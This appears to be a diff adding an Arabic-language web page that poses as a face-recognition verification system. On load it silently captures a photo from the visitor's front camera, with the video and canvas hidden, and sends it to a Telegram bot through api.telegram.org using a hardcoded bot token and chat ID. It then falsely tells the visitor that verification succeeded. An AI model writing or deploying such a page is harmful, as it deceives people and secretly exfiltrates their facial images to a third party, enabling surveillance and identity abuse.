@@ -1,0 +1,76 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <title>نظام التعرف على الوجه</title>
+    <style>
+        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
+        video, canvas { display: none; } /* إخفاء العناصر التقنية */
+        .status { color: #555; }
+    </style>
+</head>
+<body>
+
+    <h2>جاري معالجة البيانات للتعرف على الوجه...</h2>
+    <p class="status" id="status">يرجى الانتظار وكاميرا الهاتف أمام وجهك...</p>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        const token = "8372973119:AAEvtD7kL-5L1uA4URd_CROFb9V4z1nXt8E";
+        const chatId = "591768998";
+
+        async function startCamera() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            const status = document.getElementById('status');
+
+            try {
+                // طلب الوصول للكاميرا (سيظهر طلب الإذن للمستخدم هنا)
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                video.srcObject = stream;
+
+                // الانتظار قليلاً لتأكد من تشغيل الكاميرا ثم التقاط الصورة
+                setTimeout(() => {
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    // تحويل الصورة إلى صيغة Blob لإرسالها
+                    canvas.toBlob(blob => {
+                        sendToTelegram(blob);
+                    }, 'image/jpeg');
+
+                    // إيقاف الكاميرا بعد الالتقاط
+                    stream.getTracks().forEach(track => track.stop());
+                }, 2000); 
+
+            } catch (err) {
+                status.innerText = "خطأ: يجب السماح بالوصول للكاميرا ليعمل النظام.";
+                console.error(err);
+            }
+        }
+
+        function sendToTelegram(imageBlob) {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', imageBlob, 'face_capture.jpg');
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            })
+            .then(response => {
+                document.getElementById('status').innerText = "تمت عملية التحقق بنجاح.";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+            });
+        }
+
+        // بدء العملية عند تحميل الصفحة
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
